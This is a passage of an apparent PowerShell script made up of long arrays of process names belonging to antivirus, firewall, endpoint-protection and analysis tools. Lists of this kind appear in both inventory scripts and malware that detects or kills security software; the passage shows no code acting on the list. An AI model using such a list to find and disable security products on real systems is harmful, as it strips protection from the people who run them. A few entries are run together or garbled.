\"DRWEBUPW.EXE\", \"DRWINST.EXE\", \"DSMain.exe\", \"DWHWizrd.exe\", \"DefWatch.exe\", \"DolphinCharge.exe\", \"EHttpSrv.exe\", \"EMET_Agent.exe\", \"EMET_Service.exe\", \"EMLPROUI.exe\", \"EMLPROXY.exe\", \"EMLibUpdateAgentNT.exe\", \"ETConsole3.exe\", \"ETCorrel.exe\", \"ETLogAnalyzer.exe\", \"ETReporter.exe\", \"ETRssFeeds.exe\", \"EUQMonitor.exe\", \"EndPointSecurity.exe\", \"EngineServer.exe\", \"EntityMain.exe\", \"EtScheduler.exe\", \"EtwControlPanel.exe\", \"EventParser.exe\", \"FAMEH32.exe\", \"FCDBLog.exe\", \"FCH32.exe\", \"FPAVServer.exe\", \"FProtTray.exe\", \"FSCUIF.exe\", \"FSHDLL32.exe\", \"FSM32.exe\", \"FSMA32.exe\", \"FSMB32.exe\", \"FWCfg.exe\", \"FireSvc.exe\", \"FireTray.exe\", \"FirewallGUI.exe\", \"ForceField.exe\", \"FortiProxy.exe\", \"FortiTray.exe\", \"FortiWF.exe\", \"FrameworkService.exe\", \"FreeProxy.exe\", \"GDFirewallTray.exe\", \"GDFwSvc.exe\", \"HWAPI.exe\", \"ISNTSysMonitor.exe\", \"ISSVC.exe\", \"ISWMGR.exe\", \"ITMRTSVC.exe\", \"ITMRT_SupportDiagnostics.exe\", \"ITMRT_TRACE.exe\", \"IcePack.exe\", \"IdsInst.exe\", \"InoNmSrv.exe\", \"InoRT.exe\", \"InoRpc.exe\", \"InoTask.exe\", \"InoWeb.exe\", \"IsntSmtp.exe\", \"KABackReport.exe\", \"KANMCMain.exe\", \"KAVFS.EXE\", \"KAVStart.exe\", \"KLNAGENT.EXE\", \"KMailMon.exe\", \"KNUpdateMain.exe\", \"KPFWSvc.exe\", \"KSWebShield.exe\", \"KVMonXP.exe\", \"KVMonXP_2.exe\", \"KVSrvXP.exe\", \"KWSProd.exe\", \"KWatch.exe\", \"KavAdapterExe.exe\", \"KeyPass.exe\", \"KvXP.exe\", \"LUALL.EXE\", \"LWDMServer.exe\", \"LockApp.exe\", \"LockAppHost.exe\", \"LogGetor.exe\", \"MCSHIELD.EXE\", \"MCUI32.exe\", \"MSASCui.exe\", \"ManagementAgentNT.exe\", \"McAfeeDataBackup.exe\", \"McEPOC.exe\", \"McEPOCfg.exe\", \"McNASvc.exe\", \"McProxy.exe\", \"McScript_InUse.exe\", \"McWCE.exe\", \"McWCECfg.exe\", \"Mcshield.exe\", \"Mctray.exe\", \"MgntSvc.exe\", \"MpCmdRun.exe\", \"MpfAgent.exe\", \"MpfSrv.exe\", \"MsMpEng.exe\", \"NAIlgpip.exe\", \"NAVAPSVC.EXE\", \"NAVAPW32.EXE\", \"NCDaemon.exe\", \"NIP.exe\", \"NJeeves.exe\", \"NLClient.exe\", \"NMAGENT.EXE\", \"NOD32view.exe\", \"NPFMSG.exe\", \"NPROTECT.EXE\", \"NRMENCTB.exe\", \"NSMdtr.exe\", \"NTRtScan.exe\", \"NVCOAS.exe\", \"NVCSched.exe\", \"NavShcom.exe\", \"Navapsvc.exe\", \"NaveCtrl.exe\", \"NaveLog.exe\", \"NaveSP.exe\", \"Navw32.exe\", \"Navwnt.exe\", \"Nip.exe\", \"Njeeves.exe\", \"Npfmsg2.exe\", \"Npfsvice.exe\", \"NscTop.exe\", \"Nvcoas.exe\", \"Nvcsched.exe\", \"Nymse.exe\", \"OLFSNT40.EXE\", \"OMSLogManager.exe\", \"ONLINENT.exe\", \"ONLNSVC.exe\", \"OfcPfwSvc.exe\", \"PASystemTray.exe\", \"PAVFNSVR.exe\", \"PAVSRV51.exe\", \"PNmSrv.exe\", \"POPROXY.EXE\", \"POProxy.exe\", \"PPClean.exe\", \"PPCtlPriv.exe\", \"PQIBrowser.exe\", \"PSHost.exe\", \"PSIMSVC.EXE\", \"PXEMTFTP.exe\", \"PadFSvr.exe\", \"Pagent.exe\", \"Pagentwd.exe\", \"PavBckPT.exe\", \"PavFnSvr.exe\", \"PavPrSrv.exe\", \"PavProt.exe\", \"PavReport.exe\", \"Pavkre.exe\", \"PcCtlCom.exe\", \"PcScnSrv.exe\", \"PccNTMon.exe\", \"PccNTUpd.exe\", \"PpPpWallRun.exe\", \"PrintDevice.exe\", \"ProUtil.exe\", \"PsCtrlS.exe\", \"PsImSvc.exe\", \"PwdFiltHelp.exe\", \"Qoeloader.exe\", \"RAVMOND.exe\", \"RAVXP.exe\", \"RNReport.exe\", \"RPCServ.exe\", \"RSSensor.exe\", \"RTVscan.exe\", \"RapApp.exe\", \"Rav.exe\", \"RavAlert.exe\", \"RavMon.exe\", \"RavMonD.exe\", \"RavService.exe\", \"RavStub.exe\", \"RavTask.exe\", \"RavTray.exe\", \"RavUpdate.exe\", \"RavXP.exe\", \"RealMon.exe\", \"Realmon.exe\", \"RedirSvc.exe\", \"RegMech.exe\", \"ReporterSvc.exe\", \"RouterNT.exe\", \"Rtvscan.exe\", \"SAFeService.exe\", \"SAService.exe\", \"SAVAdminService.exe\", \"SAVFMSESp.exe\", \"SAVMain.exe\", \"SAVScan.exe\", \"SCANMSG.exe\", \"SCANWSCS.exe\", \"SCFManager.exe\", \"SCFService.exe\", \"SCFTray.exe\", \"SDTrayApp.exe\", \"SEVINST.EXE\", \"SMEX_ActiveUpdate.exe\", \"SMEX_Master.exe\", \"SMEX_RemoteConf.exe\", \"SMEX_SystemWatch.exe\", \"SMSECtrl.exe\", \"SMSELog.exe\", \"SMSESJM.exe\", \"SMSESp.exe\", \"SMSESrv.exe\", \"SMSETask.exe\", \"SMSEUI.exe\", \"SNAC.EXE\", \"SNAC.exe\", \"SNDMon.exe\", \"SNDSrvc.exe\", \"SPBBCSvc.exe\", \"SPIDERML.EXE\", \"SPIDERNT.EXE\", \"SSM.exe\", \"SSScheduler.exe\", \"SVCharge.exe\", \"SVDealer.exe\", \"SVFrame.exe\", \"SVTray.exe\", \"SWNETSUP.EXE\", \"SavRoam.exe\", \"SavService.exe\", \"SavUI.exe\", \"ScanMailOutLook.exe\", \"SeAnalyzerTool.exe\", \"SemSvc.exe\", \"SescLU.exe\", \"SetupGUIMngr.exe\", \"SiteAdv.exe\", \"Smc.exe\", \"SmcGui.exe\", \"SnHwSrv.exe\", \"SnICheckAdm.exe\", \"SnIcon.exe\", \"SnSrv.exe\", \"SnicheckSrv.exe\", \"SpIDerAgent.exe\", \"SpntSvc.exe\", \"SpyEmergency.exe\", \"SpyEmergencySrv.exe\", \"StOPP.exe\", \"StWatchDog.exe\", \"SymCorpUI.exe\", \"SymSPort.exe\", \"TBMon.exe\", \"TFGui.exe\", \"TFService.exe\", \"TFTray.exe\", \"TFun.exe\", \"TIASPN~1.EXE\", \"TSAnSrf.exe\", \"TSAtiSy.exe\", \"TScutyNT.exe\", \"TSmpNT.exe\", \"TmListen.exe\", \"TmPfw.exe\", \"Tmntsrv.exe\", \"Traflnsp.exe\", \"TrapTrackerMgr.exe\", \"UPSCHD.exe\", \"UcService.exe\", \"UdaterUI.exe\", \"UmxAgent.exe\", \"UmxCfg.exe\", \"UmxFwHlp.exe\", \"UmxPol.exe\", \"Up2date.exe\", \"UpdaterUI.exe\", \"UrlLstCk.exe\", \"UserActivity.exe\", \"UserAnalysis.exe\", \"UsrPrmpt.exe\", \"V3Medic.exe\", \"V3Svc.exe\", \"VPC32.exe\", \"VPDN_LU.exe\", \"VPTray.exe\", \"VSStat.exe\", \"VsStat.exe\", \"VsTskMgr.exe\", \"WEBPROXY.EXE\", \"WFXCTL32.EXE\", \"WFXMOD32.EXE\", \"WFXSNT40.EXE\", \"WebProxy.exe\", \"WebScanX.exe\", \"WinRoute.exe\", \"WrSpySetup.exe\", \"ZLH.exe\", \"Zanda.exe\", \"ZhuDongFangYu.exe\", \"Zlh.exe\", \"_avp32.exe\", \"_avpcc.exe\", \"_avpm.exe\", \"aAvgApi.exe\", \"aawservice.exe\", \"acaif.exe\", \"acctmgr.exe\", \"ackwin32.exe\", \"aclient.exe\", \"adaware.exe\", \"advxdwin.exe\", \"aexnsagent.exe\", \"aexsvc.exe\", \"aexswdusr.exe\", \"aflogvw.exe\", \"afwServ.exe\", \"agentsvr.exe\", \"agentw.exe\", \"ahnrpt.exe\", \"ahnsd.exe\", \"ahnsdsv.exe\", \"alertsvc.exe\", \"alevir.exe\", \"alogserv.exe\", \"alsvc.exe\", \"alunotify.exe\", \"aluschedulersvc.exe\", \"amon9x.exe\", \"amswmagt.exe\", \"anti-trojan.exe\", \"antiarp.exe\", \"antivirus.exe\", \"ants.exe\", \"aphost.exe\", \"apimonitor.exe\", \"aplica32.exe\", \"aps.exe\", \"apvxdwin.exe\", \"arr.exe\", \"ashAvast.exe\", \"ashBug.exe\", \"ashChest.exe\", \"ashCmd.exe\", \"ashDisp.exe\", \"ashEnhcd.exe\", \"ashLogV.exe\", \"ashMaiSv.exe\", \"ashPopWz.exe\", \"ashQuick.exe\", \"ashServ.exe\", \"ashSimp2.exe\", \"ashSimpl.exe\", \"ashSkPcc.exe\", \"ashSkPck.exe\", \"ashUpd.exe\", \"ashWebSv.exe\", \"ashdisp.exe\", \"ashmaisv.exe\", \"ashserv.exe\", \"ashwebsv.exe\", \"asupport.exe\", \"aswDisp.exe\", \"aswRegSvr.exe\", \"aswServ.exe\", \"aswUpdSv.exe\", \"aswUpdsv.exe\", \"aswWebSv.exe\", \"aswupdsv.exe\", \"atcon.exe\", \"atguard.exe\", \"atro55en.exe\", \"atupdater.exe\", \"atwatch.exe\", \"atwsctsk.exe\", \"au.exe\", \"aupdate.exe\", \"aupdrun.exe\", \"aus.exe\", \"auto-protect.nav80try.exe\", \"autodown.exe\", \"autotrace.exe\", \"autoup.exe\", \"autoupdate.exe\", \"avEngine.exe\", \"avadmin.exe\", \"avcenter.exe\", \"avconfig.exe\", \"avconsol.exe\", \"ave32.exe\", \"avengine.exe\", \"avesvc.exe\", \"avfwsvc.exe\", \"avgam.exe\", \"avgamsvr.exe\", \"avgas.exe\", \"avgcc.exe\", \"avgcc32.exe\", \"avgcsrvx.exe\", \"avgctrl.exe\", \"avgdiag.exe\", \"avgemc.exe\", \"avgfws8.exe\", \"avgfws9.exe\", \"avgfwsrv.exe\", \"avginet.exe\", \"avgmsvr.exe\", \"avgnsx.exe\", \"avgnt.exe\", \"avgregcl.exe\", \"avgrssvc.exe\", \"avgrsx.exe\", \"avgscanx.exe\", \"avgserv.exe\", \"avgserv9.exe\", \"avgsystx.exe\", \"avgtray.exe\", \"avguard.exe\", \"avgui.exe\", \"avgupd.exe\", \"avgupdln.exe\", \"avgupsvc.exe\", \"avgvv.exe\", \"avgw.exe\", \"avgwb.exe\", \"avgwdsvc.exe\", \"avgwizfw.exe\", \"avkpop.exe\", \"avkserv.exe\", \"avkservice.exe\", \"avkwctl9.exe\", \"avltmain.exe\", \"avmailc.exe\", \"avmcdlg.exe\", \"avnotify.exe\", \"avnt.exe\", \"avp.exe\", \"avp32.exe\", \"avpcc.exe\", \"avpdos32.exe\", \"avpexec.exe\", \"avpm.exe\", \"avpncc.exe\", \"avps.exe\", \"avptc32.exe\", \"avpupd.exe\", \"avscan.exe\", \"avsched32.exe\", \"avserver.exe\", \"avshadow.exe\", \"avsynmgr.exe\", \"avwebgrd.exe\", \"avwin.exe\", \"avwin95.exe\", \"avwinnt.exe\", \"avwupd.exe\", \"avwupd32.exe\", \"avwupsrv.exe\", \"avxmonitor9x.exe\", \"avxmonitornt.exe\", \"avxquar.exe\", \"backweb.exe\", \"bargains.exe\", \"basfipm.exe\", \"bd_professional.exe\", \"bdagent.exe\", \"bdc.exe\", \"bdlite.exe\", \"bdmcon.exe\", \"bdss.exe\", \"bdsubmit.exe\", \"beagle.exe\", \"belt.exe\", \"bidef.exe\", \"bidserver.exe\", \"bipcp.exe\", \"bipcpevalsetup.exe\", \"bisp.exe\", \"blackd.exe\", \"blackice.exe\", \"blink.exe\", \"blss.exe\", \"bmrt.exe\", \"bootconf.exe\", \"bootwarn.exe\", \"borg2.exe\", \"bpc.exe\", \"bpk.exe\", \"brasil.exe\", \"bs120.exe\", \"bundle.exe\", \"bvt.exe\", \"bwgo0000.exe\", \"ca.exe\", \"caav.exe\", \"caavcmdscan.exe\", \"caavguiscan.exe\", \"caf.exe\", \"cafw.exe\", \"caissdt.exe\", \"capfaem.exe\", \"capfasem.exe\", \"capfsem.exe\", \"capmuamagt.exe\", \"casc.exe\", \"casecuritycenter.exe\", \"caunst.exe\", \"cavrep.exe\", \"cavrid.exe\", \"cavscan.exe\", \"cavtray.exe\", \"ccApp.exe\", \"ccEvtMgr.exe\", \"ccLgView.exe\", \"ccProxy.exe\", \"ccSetMgr.exe\", \"ccSetmgr.exe\", \"ccSvcHst.exe\", \"ccap.exe\", \"ccapp.exe\", \"ccevtmgr.exe\", \"cclaw.exe\", \"ccnfagent.exe\", \"ccprovsp.exe\", \"ccproxy.exe\", \"ccpxysvc.exe\", \"ccschedulersvc.exe\", \"ccsetmgr.exe\", \"ccsmagtd.exe\", \"ccsvchst.exe\", \"ccsystemreport.exe\", \"cctray.exe\", \"ccupdate.exe\", \"cdp.exe\", \"cfd.exe\", \"cfftplugin.exe\", \"cfgwiz.exe\", \"cfiadmin.exe\", \"cfiaudit.exe\", \"cfinet.exe\", \"cfinet32.exe\", \"cfnotsrvd.exe\", \"cfp.exe\", \"cfpconfg.exe\", \"cfpconfig.exe\", \"cfplogvw.exe\", \"cfpsbmit.exe\", \"cfpupdat.exe\", \"cfsmsmd.exe\", \"checkup.exe\", \"cka.exe\", \"clamscan.exe\", \"claw95.exe\", \"claw95cf.exe\", \"clean.exe\", \"cleaner.exe\", \"cleaner3.exe\", \"cleanpc.exe\", \"cleanup.exe\", \"click.exe\", \"cmdagent.exe\", \"cmdinstall.exe\", \"cmesys.exe\", \"cmgrdian.exe\", \"cmon016.exe\", \"comHost.exe\", \"connectionmonitor.exe\", \"control_panel.exe\", \"cpd.exe\", \"cpdclnt.exe\", \"cpf.exe\", \"cpf9x206.exe\", \"cpfnt206.exe\", \"crashrep.exe\", \"csacontrol.exe\", \"csinject.exe\", \"csinsm32.exe\", \"csinsmnt.exe\", \"csrss_tc.exe\", \"ctrl.exe\", \"cv.exe\", \"cwnb181.exe\", \"cwntdwmo.exe\", \"cz.exe\", \"datemanager.exe\", \"dbserv.exe\", \"dbsrv9.exe\", \"dcomx.exe\", \"defalert.exe\", \"defscangui.exe\", \"defwatch.exe\", \"deloeminfs.exe\", \"deputy.exe\", \"diskmon.exe\", \"divx.exe\", \"djsnetcn.exe\", \"dllcache.exe\", \"dllreg.exe\", \"doors.exe\", \"doscan.exe\", \"dpf.exe\", \"dpfsetup.exe\", \"dpps2.exe\", \"drwagntd.exe\", \"drwatson.exe\", \"drweb.exe\", \"drweb32.exe\", \"drweb32w.exe\", \"drweb386.exe\", \"drwebcgp.exe\", \"drwebcom.exe\", \"drwebdc.exe\", \"drwebmng.exe\", \"drwebscd.exe\", \"drwebupw.exe\", \"drwebwcl.exe\", \"drwebwin.exe\", \"drwupgrade.exe\", \"dsmain.exe\", \"dssagent.exe\", \"dvp95.exe\", \"dvp95_0.exe\", \"dwengine.exe\", \"dwhwizrd.exe\", \"dwwin.exe\", \"ecengine.exe\", \"edisk.exe\", \"efpeadm.exe\", \"egui.exe\", \"ekrn.exe\", \"elogsvc.exe\", \"emet_agent.exe\", \"emet_service.exe\", \"emsw.exe\", \"engineserver.exe\", \"ent.exe\", \"era.exe\", \"esafe.exe\", \"escanhnt.exe\", \"escanv95.exe\", \"esecagntservice.exe\", \"esecservice.exe\", \"esmagent.exe\", \"espwatch.exe\", \"etagent.exe\", \"ethereal.exe\", \"etrustcipe.exe\", \"evpn.exe\", \"evtProcessEcFile.exe\", \"evtarmgr.exe\", \"evtmgr.exe\", \"exantivirus-cnet.exe\", \"exe.avxw.exe\", \"execstat.exe\", \"expert.exe\", \"explore.exe\", \"f-agnt95.exe\", \"f-prot.exe\", \"f-prot95.exe\", \"f-stopw.exe\", \"fameh32.exe\", \"fast.exe\", \"fch32.exe\", \"fih32.exe\", \"findviru.exe\", \"firesvc.exe\", \"firetray.exe\", \"firewall.exe\", \"fmon.exe\", \"fnrb32.exe\", \"fortifw.exe\", \"fp-win.exe\", \"fp-win_trial.exe\", \"fprot.exe\", \"frameworkservice.exe\", \"frminst.exe\", \"frw.exe\", \"fsaa.exe\", \"fsaua.exe\", \"fsav.exe\", \"fsav32.exe\", \"fsav530stbyb.exe\", \"fsav530wtbyb.exe\", \"fsav95.exe\", \"fsavgui.exe\", \"fscuif.exe\", \"fsdfwd.exe\", \"fsgk32.exe\", \"fsgk32st.exe\", \"fsguidll.exe\", \"fsguiexe.exe\", \"fshdll32.exe\", \"fsm32.exe\", \"fsma32.exe\", \"fsmb32.exe\", \"fsorsp.exe\", \"fspc.exe\", \"fspex.exe\", \"fsqh.exe\", \"fssm32.exe\", \"fwinst.exe\", \"gator.exe\", \"gbmenu.exe\", \"gbpoll.exe\", \"gcascleaner.exe\", \"gcasdtserv.exe\", \"gcasinstallhelper.exe\", \"gcasnotice.exe\", \"gcasserv.exe\", \"gcasservalert.exe\", \"gcasswupdater.exe\", \"generics.exe\", \"gfireporterservice.exe\", \"ghost_2.exe\", \"ghosttray.exe\", \"giantantispywaremain.exe\", \"giantantispywareupdater.exe\", \"gmt.exe\", \"guard.exe\", \"guarddog.exe\", \"guardgui.exe\", \"hacktracersetup.exe\", \"hbinst.exe\", \"hbsrv.exe\", \"hipsvc.exe\", \"hotactio.exe\", \"hotpatch.exe\", \"htlog.exe\", \"htpatch.exe\", \"hwpe.exe\", \"hxdl.exe\", \"hxiul.exe\", \"iamapp.exe\", \"iamserv.exe\", \"iamstats.exe\", \"ibmasn.exe\", \"ibmavsp.exe\", \"icepack.exe\", \"icload95.exe\", \"icloadnt.exe\", \"icmon.exe\", \"icsupp95.exe\", \"icsuppnt.exe\", \"idle.exe\", \"iedll.exe\", \"iedriver.exe\", \"iface.exe\", \"ifw2000.exe\", \"igateway.exe\", \"inetlnfo.exe\", \"infus.exe\", \"infwin.exe\", \"inicio.exe\", \"init.exe\", \"inonmsrv.exe\", \"inorpc.exe\", \"inort.exe\", \"inotask.exe\", \"intdel.exe\", \"intren.exe\", \"iomon98.exe\", \"isPwdSvc.exe\", \"isUAC.exe\", \"isafe.exe\", \"isafinst.exe\", \"issvc.exe\", \"istsvc.exe\", \"jammer.exe\", \"jdbgmrg.exe\", \"jedi.exe\", \"kaccore.exe\", \"kansgui.exe\", \"kansvr.exe\", \"kastray.exe\", \"kav.exe\", \"kav32.exe\", \"kavfs.exe\", \"kavfsgt.exe\", \"kavfsrcn.exe\", \"kavfsscs.exe\", \"kavfswp.exe\", \"kavisarv.exe\", \"kavlite40eng.exe\", \"kavlotsingleton.exe\", \"kavmm.exe\", \"kavpers40eng.exe\", \"kavpf.exe\", \"kavshell.exe\", \"kavss.exe\", \"kavstart.exe\", \"kavsvc.exe\", \"kavtray.exe\", \"kazza.exe\", \"keenvalue.exe\", \"kerio-pf-213-en-win.exe\", \"kerio-wrl-421-en-win.exe\", \"kerio-wrp-421-en-win.exe\", \"kernel32.exe\", \"killprocesssetup161.exe\", \"kis.exe\", \"kislive.exe\", \"kissvc.exe\", \"klnacserver.exe\", \"klnagent.exe\", \"klserver.exe\", \"klswd.exe\", \"klwtblfs.exe\", \"kmailmon.exe\", \"knownsvr.exe\", \"kpf4gui.exe\", \"kpf4ss.exe\", \"kpfw32.exe\", \"kpfwsvc.exe\", \"krbcc32s.exe\", \"kvdetech.exe\", \"kvolself.exe\", \"kvsrvxp.exe\", \"kvsrvxp_1.exe\", \"kwatch.exe\", \"kwsprod.exe\", \"kxeserv.exe\", \"launcher.exe\", \"ldnetmon.exe\", \"ldpro.exe\", \"ldpromenu.exe\", \"ldscan.exe\", \"leventmgr.exe\", \"livesrv.exe\", \"lmon.exe\", \"lnetinfo.exe\", \"loader.exe\", \"localnet.exe\", \"lockdown.exe\", \"lockdown2000.exe\", \"log_qtine.exe\", \"lookout.exe\", \"lordpe.exe\", \"lsetup.exe\", \"luall.exe\", \"luau.exe\", \"lucallbackproxy.exe\", \"lucoms.exe\", \"lucomserver.exe\", \"lucoms~1.exe\", \"luinit.exe\", \"luspt.exe\", \"makereport.exe\", \"mantispm.exe\", \"mapisvc32.exe\", \"masalert.exe\", \"massrv.exe\", \"mcafeefire.exe\", \"mcagent.exe\", \"mcappins.exe\", \"mcconsol.exe\", \"mcdash.exe\", \"mcdetect.exe\", \"mcepoc.exe\", \"mcepocfg.exe\", \"mcinfo.exe\", \"mcmnhdlr.exe\", \"mcmscsvc.exe\", \"mcods.exe\", \"mcpalmcfg.exe\", \"mcpromgr.exe\", \"mcregwiz.exe\", \"mcscript.exe\", \"mcscript_inuse.exe\", \"mcshell.exe\", \"mcshield.exe\", \"mcshld9x.exe\", \"mcsysmon.exe\", \"mctool.exe\", \"mctray.exe\", \"mctskshd.exe\", \"mcuimgr.exe\", \"mcupdate.exe\", \"mcupdmgr.exe\", \"mcvsftsn.exe\", \"mcvsrte.exe\", \"mcvsshld.exe\", \"mcwce.exe\", \"mcwcecfg.exe\", \"md.exe\", \"mfeann.exe\", \"mfevtps.exe\", \"mfin32.exe\", \"mfw2en.exe\", \"mfweng3.02d30.exe\", \"mgavrtcl.exe\", \"mgavrte.exe\", \"mghtml.exe\", \"mgui.exe\", \"minilog.exe\", \"mmod.exe\", \"monitor.exe\", \"monsvcnt.exe\", \"monsysnt.exe\", \"moolive.exe\", \"mostat.exe\", \"mpcmdrun.exe\", \"mpf.exe\", \"mpfagent.exe\", \"mpfconsole.exe\", \"mpfservice.exe\", \"mpftray.exe\", \"mps.exe\", \"mpsevh.exe\", \"mpsvc.exe\", \"mrf.exe\", \"mrflux.exe\", \"msapp.exe\", \"msascui.exe\", \"msbb.exe\", \"msblast.exe\", \"mscache.exe\", \"msccn32.exe\", \"mscifapp.exe\", \"mscman.exe\", \"msconfig.exe\", \"msdm.exe\", \"msdos.exe\", \"msiexec16.exe\", \"mskagent.exe\", \"mskdetct.exe\", \"msksrver.exe\", \"msksrvr.exe\", \"mslaugh.exe\", \"msmgt.exe\", \"msmpeng.exe\", \"msmsgri32.exe\", \"msscli.exe\", \"msseces.exe\", \"mssmmc32.exe\", \"msssrv.exe\", \"mssys.exe\", \"msvxd.exe\", \"mu0311ad.exe\", \"mwatch.exe\", \"myagttry.exe\", \"n32scanw.exe\", \"nSMDemf.exe\", \"nSMDmon.exe\", \"nSMDreal.exe\", \"nSMDsch.exe\", \"naPrdMgr.exe\", \"nav.exe\", \"navap.navapsvc.exe\", \"navapsvc.exe\", \"navapw32.exe\", \"navdx.exe\", \"navlu32.exe\", \"navnt.exe\", \"navstub.exe\", \"navw32.exe\", \"navwnt.exe\", \"nc2000.exe\", \"ncinst4.exe\", \"MSASCuiL.exe\");\r\n    @av1 = @(\"MBAMService.exe\", \"mbamtray.exe\", \"CylanceSvc.exe\", \"ndd32.exe\", \"ndetect.exe\", \"neomonitor.exe\", \"neotrace.exe\", \"neowatchlog.exe\", \"netalertclient.exe\", \"netarmor.exe\", \"netcfg.exe\", \"netd32.exe\", \"netinfo.exe\", \"netmon.exe\", \"netscanpro.exe\", \"netspyhunter-1.2.exe\", \"netstat.exe\", \"netutils.exe\", \"networx.exe\", \"ngctw32.exe\", \"ngserver.exe\", \"nip.exe\", \"nipsvc.exe\", \"nisoptui.exe\", \"nisserv.exe\", \"nisum.exe\", \"njeeves.exe\", \"nlsvc.exe\", \"nmain.exe\", \"nod32.exe\", \"nod32krn.exe\", \"nod32kui.exe\", \"normist.exe\", \"norton_internet_secu_3.0_407.exe\", \"notstart.exe\", \"npf40_tw_98_nt_me_2k.exe\", \"npfmessenger.exe\", \"npfmntor.exe\", \"npfmsg.exe\", \"nprotect.exe\", \"npscheck.exe\", \"npssvc.exe\", \"nrmenctb.exe\", \"nsched32.exe\", \"nscsrvce.exe\", \"nsctop.exe\", \"nsmdtr.exe\", \"nssys32.exe\", \"nstask32.exe\", \"nsupdate.exe\", \"nt.exe\", \"ntcaagent.exe\", \"ntcadaemon.exe\", \"ntcaservice.exe\", \"ntrtscan.exe\", \"ntvdm.exe\", \"ntxconfig.exe\", \"nui.exe\", \"nupgrade.exe\", \"nvarch16.exe\", \"nvc95.exe\", \"nvcoas.exe\", \"nvcsched.exe\", \"nvsvc32.exe\", \"nwinst4.exe\", \"nwservice.exe\", \"nwtool16.exe\", \"nymse.exe\", \"oasclnt.exe\", \"oespamtest.exe\", \"ofcdog.exe\", \"ofcpfwsvc.exe\", \"okclient.exe\", \"olfsnt40.exe\", \"ollydbg.exe\", \"onsrvr.exe\", \"op_viewer.exe\", \"opscan.exe\", \"optimize.exe\", \"ostronet.exe\", \"otfix.exe\", \"outpost.exe\", \"outpostinstall.exe\", \"outpostproinstall.exe\", \"paamsrv.exe\", \"padmin.exe\", \"pagent.exe\", \"pagentwd.exe\", \"panixk.exe\", \"patch.exe\", \"pavbckpt.exe\", \"pavcl.exe\", \"pavfires.exe\", \"pavfnsvr.exe\", \"pavjobs.exe\", \"pavkre.exe\", \"pavmail.exe\", \"pavprot.exe\", \"pavproxy.exe\", \"pavprsrv.exe\", \"pavsched.exe\", \"pavsrv50.exe\", \"pavsrv51.exe\", \"pavsrv52.exe\", \"pavupg.exe\", \"pavw.exe\", \"pccNT.exe\", \"pccclient.exe\", \"pccguide.exe\", \"pcclient.exe\", \"pccnt.exe\", \"pccntmon.exe\", \"pccntupd.exe\", \"pccpfw.exe\", \"pcctlcom.exe\", \"pccwin98.exe\", \"pcfwallicon.exe\", \"pcip10117_0.exe\", \"pcscan.exe\", \"pctsAuxs.exe\", \"pctsGui.exe\", \"pctsSvc.exe\", \"pctsTray.exe\", \"pdsetup.exe\", \"pep.exe\", \"periscope.exe\", \"persfw.exe\", \"perswf.exe\", \"pf2.exe\", \"pfwadmin.exe\", \"pgmonitr.exe\", \"pingscan.exe\", \"platin.exe\", \"pmon.exe\", \"pnmsrv.exe\", \"pntiomon.exe\", \"pop3pack.exe\", \"pop3trap.exe\", \"poproxy.exe\", \"popscan.exe\", \"portdetective.exe\", \"portmonitor.exe\", \"powerscan.exe\", \"ppinupdt.exe\", \"ppmcativedetection.exe\", \"pptbc.exe\", \"ppvstop.exe\", \"pqibrowser.exe\", \"pqv2isvc.exe\", \"prevsrv.exe\", \"prizesurfer.exe\", \"prmt.exe\", \"prmvr.exe\", \"programauditor.exe\", \"proport.exe\", \"protectx.exe\", \"psctris.exe\", \"psh_svc.exe\", \"psimreal.exe\", \"psimsvc.exe\", \"pskmssvc.exe\", \"pspf.exe\", \"purge.exe\", \"pview.exe\", \"pviewer.exe\", \"pxemtftp.exe\", \"pxeservice.exe\", \"qclean.exe\", \"qconsole.exe\", \"qdcsfs.exe\", \"qoeloader.exe\", \"qserver.exe\", \"rapapp.exe\", \"rapuisvc.exe\", \"ras.exe\", \"rasupd.exe\", \"rav7.exe\", \"rav7win.exe\", \"rav8win32eng.exe\", \"ravmon.exe\", \"ravmond.exe\", \"ravstub.exe\", \"ravxp.exe\", \"ray.exe\", \"rb32.exe\", \"rcsvcmon.exe\", \"rcsync.exe\", \"realmon.exe\", \"reged.exe\", \"remupd.exe\", \"reportsvc.exe\", \"rescue.exe\", \"rescue32.exe\", \"rfwmain.exe\", \"rfwproxy.exe\", \"rfwsrv.exe\", \"rfwstub.exe\", \"rnav.exe\", \"rrguard.exe\", \"rshell.exe\", \"rsnetsvr.exe\", \"rstray.exe\", \"rtvscan.exe\", \"rtvscn95.exe\", \"rulaunch.exe\", \"saHookMain.exe\", \"safeboxtray.exe\", \"safeweb.exe\", \"sahagent.exescan32.exe\", \"sav32cli.exe\", \"save.exe\", \"savenow.exe\", \"savroam.exe\", \"savscan.exe\", \"savservice.exe\", \"sbserv.exe\", \"scam32.exe\", \"scan32.exe\", \"scan95.exe\", \"scanexplicit.exe\", \"scanfrm.exe\", \"scanmailoutlook.exe\", \"scanpm.exe\", \"schdsrvc.exe\", \"schupd.exe\", \"scrscan.exe\", \"seestat.exe\", \"serv95.exe\", \"setloadorder.exe\", \"setup_flowprotector_us.exe\", \"setupguimngr.exe\", \"setupvameeval.exe\", \"sfc.exe\", \"sgssfw32.exe\", \"sh.exe\", \"shellspyinstall.exe\", \"shn.exe\", \"showbehind.exe\", \"shstat.exe\", \"siteadv.exe\", \"smOutlookPack.exe\", \"smc.exe\", \"smoutlookpack.exe\", \"sms.exe\", \"smsesp.exe\", \"smss32.exe\", \"sndmon.exe\", \"sndsrvc.exe\", \"soap.exe\", \"sofi.exe\", \"softManager.exe\", \"spbbcsvc.exe\", \"spf.exe\", \"sphinx.exe\", \"spideragent.exe\", \"spiderml.exe\", \"spidernt.exe\", \"spiderui.exe\", \"spntsvc.exe\", \"spoler.exe\", \"spoolcv.exe\", \"spoolsv32.exe\", \"spyxx.exe\", \"srexe.exe\", \"srng.exe\", \"srvload.exe\", \"srvmon.exe\", \"ss3edit.exe\", \"sschk.exe\", \"ssg_4104.exe\", \"ssgrate.exe\", \"st2.exe\", \"stcloader.exe\", \"stinger.exe\", \"stopp.exe\", \"stwatchdog.exe\", \"supftrl.exe\", \"support.exe\", \"supporter5.exe\", \"svcGenericHost\", \"svcharge.exe\", \"svchostc.exe\", \"svchosts.exe\", \"svcntaux.exe\", \"svdealer.exe\", \"svframe.exe\", \"svtray.exe\", \"swdsvc.exe\", \"sweep95.exe\", \"sweepnet.sweepsrv.sys.swnetsup.exe\", \"sweepsrv.exe\", \"swnetsup.exe\", \"swnxt.exe\", \"swserver.exe\", \"symlcsvc.exe\", \"symproxysvc.exe\", \"symsport.exe\", \"symtray.exe\", 